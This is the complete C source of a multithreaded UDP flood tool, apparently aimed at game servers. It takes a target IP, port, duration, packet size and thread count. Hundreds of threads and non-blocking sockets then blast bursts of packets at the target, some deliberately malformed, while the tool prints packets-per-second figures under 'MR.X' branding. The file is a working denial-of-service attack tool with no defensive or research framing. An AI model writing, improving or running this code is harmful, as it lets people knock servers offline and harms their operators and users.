#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>

// ========== INSTANT 677ms STUCK ==========
#define MAX_SOCKETS 300
#define MAX_THREADS 200
#define MAX_PACKET_SIZE 1024
#define MIN_PACKET_SIZE 64
#define MAX_TIME 600
#define MIN_TIME 10
#define SOCKET_BUFFER 33554432
#define PORT_RANGE 50000
#define MIN_PORT 10000
#define BURST_SIZE 80
#define RECONNECT_AFTER 20000
#define STATS_INTERVAL 2
#define BATCH_UPDATE 5000
#define MALFORM_CHANCE 30
#define THREAD_STAGGER_US 1000

char TARGET_IP[INET_ADDRSTRLEN];
int TARGET_PORT;
int ATTACK_DURATION;
int PACKET_SIZE_VALUE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long current_pps = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_all = 0;

struct sockaddr_in target_addr;

void handle_signal(int sig) {
    atomic_store(&stop_all, 1);
}

unsigned int fast_random(unsigned int *seed) {
    *seed = (*seed * 1103515245 + 12345);
    return *seed ^ (*seed >> 16);
}

int setup_socket(int sock) {
    int buf = SOCKET_BUFFER;
    int reuse = 1;
    
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    
    #ifdef SO_REUSEPORT
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));
    #endif
    
    return 0;
}

void create_packet(char *buffer, int size, int thread_id, unsigned int seq, unsigned int *seed) {
    int actual = size;
    if (actual > MAX_PACKET_SIZE) actual = MAX_PACKET_SIZE;
    if (actual < MIN_PACKET_SIZE) actual = MIN_PACKET_SIZE;
    
    memset(buffer, 0, actual);
    
    buffer[0] = 0x42;
    buffer[1] = 0x47;
    buffer[2] = 0x4D;
    buffer[3] = 0x49;
    
    unsigned int *h = (unsigned int*)(buffer + 4);
    
    unsigned int types[] = {htonl(0x00010001), htonl(0x00010002), htonl(0x00020001), 
                           htonl(0x00030001), htonl(0x00040001)};
    int type_idx = (thread_id + seq) % 5;
    h[0] = types[type_idx];
    
    h[1] = htonl(seq + thread_id * 100000);
    h[2] = htonl((unsigned int)time(NULL));
    
    for (int i = 20; i < actual; i++) {
        buffer[i] = (fast_random(seed) + i + thread_id + seq) & 0xFF;
    }
    
    if ((fast_random(seed) % 100) < MALFORM_CHANCE) {
        buffer[4] = 0xFF;
        buffer[5] = 0xFF;
        if ((fast_random(seed) % 2) == 0) {
            buffer[0] = 0x00;
        }
    }
}

int create_socket(unsigned int *seed) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return -1;
    
    setup_socket(sock);
    
    if (fcntl(sock, F_SETFL, O_NONBLOCK) < 0) {
        close(sock);
        return -1;
    }
    
    struct sockaddr_in local;
    memset(&local, 0, sizeof(local));
    local.sin_family = AF_INET;
    local.sin_port = htons(MIN_PORT + (fast_random(seed) % PORT_RANGE));
    local.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(sock, (struct sockaddr*)&local, sizeof(local)) != 0) {
        close(sock);
        return -1;
    }
    
    return sock;
}

void *attack_thread(void *arg) {
    int tid = *((int *)arg);
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    unsigned int seed = (tid * 1234567) ^ getpid() ^ (tv.tv_usec & 0xFFFF);
    
    int socks[MAX_SOCKETS];
    char *packets[MAX_SOCKETS];
    
    for (int i = 0; i < MAX_SOCKETS; i++) {
        socks[i] = -1;
        packets[i] = NULL;
    }
    
    for (int i = 0; i < MAX_SOCKETS; i++) {
        socks[i] = create_socket(&seed);
        if (socks[i] < 0) continue;
        
        packets[i] = malloc(PACKET_SIZE_VALUE);
        if (!packets[i]) {
            close(socks[i]);
            socks[i] = -1;
        }
    }
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    unsigned int seq = tid * 100000;
    unsigned int sent[MAX_SOCKETS];
    
    for (int i = 0; i < MAX_SOCKETS; i++) {
        sent[i] = 0;
    }
    
    while (!atomic_load(&stop_all)) {
        for (int i = 0; i < MAX_SOCKETS && !atomic_load(&stop_all); i++) {
            if (socks[i] < 0 || !packets[i]) continue;
            
            if (sent[i] > RECONNECT_AFTER) {
                close(socks[i]);
                socks[i] = create_socket(&seed);
                sent[i] = 0;
                if (socks[i] < 0) {
                    free(packets[i]);
                    packets[i] = NULL;
                    continue;
                }
            }
            
            create_packet(packets[i], PACKET_SIZE_VALUE, tid, seq, &seed);
            
            for (int b = 0; b < BURST_SIZE && !atomic_load(&stop_all); b++) {
                int ret = sendto(socks[i], packets[i], PACKET_SIZE_VALUE, MSG_DONTWAIT,
                               (struct sockaddr*)&target_addr, sizeof(target_addr));
                if (ret > 0) {
                    local_packets++;
                    local_bytes += ret;
                    seq++;
                    sent[i]++;
                }
            }
        }
        
        if (local_packets >= BATCH_UPDATE) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
        
        usleep(100);
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    for (int i = 0; i < MAX_SOCKETS; i++) {
        if (socks[i] >= 0) close(socks[i]);
        if (packets[i]) free(packets[i]);
    }
    
    return NULL;
}

void *show_stats(void *arg) {
    unsigned long long last_packets = 0;
    unsigned long long last_bytes = 0;
    time_t last_time = 0;
    
    int first = 1;
    
    while (!atomic_load(&stop_all)) {
        sleep(STATS_INTERVAL);
        
        time_t now = time(NULL);
        if (first) {
            last_packets = atomic_load(&total_packets);
            last_bytes = atomic_load(&total_bytes);
            last_time = now;
            first = 0;
            continue;
        }
        
        int elapsed = now - last_time;
        if (elapsed <= 0) continue;
        
        unsigned long long curr_p = atomic_load(&total_packets);
        unsigned long long curr_b = atomic_load(&total_bytes);
        
        if (curr_p < last_packets) {
            last_packets = curr_p;
            last_bytes = curr_b;
            last_time = now;
            continue;
        }
        
        unsigned long long diff_p = curr_p - last_packets;
        unsigned long long diff_b = curr_b - last_bytes;
        
        double pps = (double)diff_p / elapsed;
        double mb = diff_b / (1024.0 * 1024.0);
        
        atomic_store(&current_pps, (unsigned long long)pps);
        
        if (pps > atomic_load(&peak_pps)) {
            atomic_store(&peak_pps, (unsigned long long)pps);
        }
        
        printf("🔥  PPS: %.0fK | Peak: %lluK | %.1fMB\n", 
               pps/1000, atomic_load(&peak_pps)/1000, mb);
        
        last_packets = curr_p;
        last_bytes = curr_b;
        last_time = now;
    }
    
    return NULL;
}

void *run_timer(void *arg) {
    int *time = (int *)arg;
    for (int i = 0; i < *time && !atomic_load(&stop_all); i++) {
        sleep(1);
    }
    atomic_store(&stop_all, 1);
    return NULL;
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    
    if (argc != 6) {
        printf("Use: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        printf("TIME: %d-%d sec\n", MIN_TIME, MAX_TIME);
        printf("SIZE: %d-%d bytes\n", MIN_PACKET_SIZE, MAX_PACKET_SIZE);
        printf("THREADS: 10-%d\n", MAX_THREADS);
        return 1;
    }
    
    strncpy(TARGET_IP, argv[1], sizeof(TARGET_IP)-1);
    TARGET_IP[sizeof(TARGET_IP)-1] = '\0';
    
    char *end;
    TARGET_PORT = (int)strtol(argv[2], &end, 10);
    if (*end != '\0' || TARGET_PORT <= 0 || TARGET_PORT > 65535) {
        printf("Bad port\n");
        return 1;
    }
    
    ATTACK_DURATION = (int)strtol(argv[3], &end, 10);
    if (*end != '\0' || ATTACK_DURATION < MIN_TIME) ATTACK_DURATION = MIN_TIME;
    if (ATTACK_DURATION > MAX_TIME) ATTACK_DURATION = MAX_TIME;
    
    PACKET_SIZE_VALUE = (int)strtol(argv[4], &end, 10);
    if (*end != '\0' || PACKET_SIZE_VALUE < MIN_PACKET_SIZE) PACKET_SIZE_VALUE = MIN_PACKET_SIZE;
    if (PACKET_SIZE_VALUE > MAX_PACKET_SIZE) PACKET_SIZE_VALUE = MAX_PACKET_SIZE;
    
    THREAD_COUNT = (int)strtol(argv[5], &end, 10);
    if (*end != '\0' || THREAD_COUNT < 10) THREAD_COUNT = 10;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("Bad IP\n");
        return 1;
    }
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    srand(tv.tv_usec ^ getpid() ^ ((unsigned int)time(NULL) << 16));
    
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    
    atomic_store(&total_packets, 0);
    atomic_store(&total_bytes, 0);
    atomic_store(&current_pps, 0);
    atomic_store(&peak_pps, 0);
    atomic_store(&stop_all, 0);
    
    printf("\n🔥 MR.X FATHER OF TG 🔥\n\n");
    printf("🎯 Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("⏰ Time: %d | 📦 Packet: %d\n", ATTACK_DURATION, PACKET_SIZE_VALUE);
    printf("👥 Threads: %d\n\n", THREAD_COUNT);
    
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *tids = malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !tids) {
        printf("Memory error\n");
        return 1;
    }
    
    int created = 0;
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        if (pthread_create(&threads[i], NULL, attack_thread, &tids[i]) == 0) {
            created++;
        } else {
            tids[i] = -1;
        }
        if (THREAD_STAGGER_US > 0) {
            usleep(THREAD_STAGGER_US);
        }
    }
    
    printf("Started %d threads\n\n", created);
    
    pthread_t timer_thread;
    if (pthread_create(&timer_thread, NULL, run_timer, &ATTACK_DURATION) != 0) {
        printf("Timer error\n");
        atomic_store(&stop_all, 1);
    }
    
    pthread_t stats_thread;
    if (pthread_create(&stats_thread, NULL, show_stats, NULL) != 0) {
        printf("Stats error\n");
        atomic_store(&stop_all, 1);
    }
    
    pthread_join(timer_thread, NULL);
    
    atomic_store(&stop_all, 1);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (tids[i] != -1) {
            pthread_join(threads[i], NULL);
        }
    }
    
    pthread_join(stats_thread, NULL);
    
    unsigned long long final_p = atomic_load(&total_packets);
    unsigned long long final_b = atomic_load(&total_bytes);
    
    if (ATTACK_DURATION > 0) {
        double avg_pps = final_p / (double)ATTACK_DURATION;
        double total_gb = final_b / (1024.0 * 1024.0 * 1024.0);
        
        printf("\n🚀 MR.X NEVER END 🚀\n\n");
        printf("✅ Total Packets: %llu\n", final_p);
        printf("🚀 AVERAGE PPS: %.0fK\n", avg_pps/1000);
        printf("💾 Total Data: %.2fGB\n", total_gb);
    }
    
    free(threads);
    free(tids);
    
    return 0;
}